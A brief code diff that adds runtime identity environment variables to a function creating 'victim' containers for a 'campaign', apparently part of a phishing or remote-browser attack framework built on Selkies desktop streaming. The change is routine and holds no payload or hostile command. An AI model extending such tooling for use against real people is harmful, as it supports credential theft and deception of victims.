@@ -30,6 +30,7 @@ from utils.plugin_files import (
     normalize_plugin_file_path,
 )
 from utils.storage import get_host_campaign_storage_path, setup_campaign_storage
+from utils.runtime_identity import runtime_identity_environment
 
 
 logger = logging.getLogger(__name__)
@@ -410,6 +411,7 @@ def create_victim_container(campaign, victim_id: str, user_agent: str, theme: st
             "CUSTOM_HTTPS_PORT": str(custom_https_port),
             "CUSTOM_WS_PORT": str(custom_ws_port),
             **selkies_env,
+            **runtime_identity_environment(linuxserver=True),
             "HARDEN_DESKTOP": "true",
             "HARDEN_OPENBOX": "true",
             "SELKIES_FILE_TRANSFERS": "",
